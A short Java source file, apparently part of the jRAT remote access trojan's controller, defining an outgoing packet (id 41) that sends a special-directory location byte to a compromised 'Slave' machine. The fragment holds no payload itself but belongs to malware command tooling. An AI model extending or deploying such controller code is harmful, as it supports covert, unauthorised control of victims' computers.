package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet41SpecialDirectory extends AbstractOutgoingPacket {

	private int location;

	public Packet41SpecialDirectory(int location) {
		this.location = location;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeByte(location);
	}

	@Override
	public short getPacketId() {
		return 41;
	}

}
